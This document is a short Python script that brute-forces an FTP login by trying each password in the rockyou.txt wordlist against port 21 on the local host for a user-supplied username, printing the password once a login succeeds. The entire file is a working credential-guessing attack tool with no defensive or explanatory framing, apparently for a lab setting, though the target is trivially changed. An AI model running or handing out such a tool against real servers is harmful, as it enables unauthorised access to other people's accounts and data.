#!/usr/bin/python3

import ftplib
import os
import socket

user = input("Username: ")

server = socket.gethostbyname(socket.gethostname())

current_dir = os.path.dirname(os.path.abspath(__file__))
password_list = os.path.join(current_dir, "rockyou.txt")

try:
    with open(password_list, 'r', encoding="latin-1") as pw:
        for word in pw:
            word = word.strip('\r\n')
            
            try:
                ftp = ftplib.FTP()
                ftp.connect(server, 21)
                ftp.login(user, word)
                print("Success! The password is " + word)
                ftp.quit()
                break
                
            except ftplib.error_perm:
                print(f"Still trying... {word}")

except FileNotFoundError:
    print("Error: rockyou.txt not found in the script directory.")
except Exception as exc:
    print("Wordlist error:", exc)
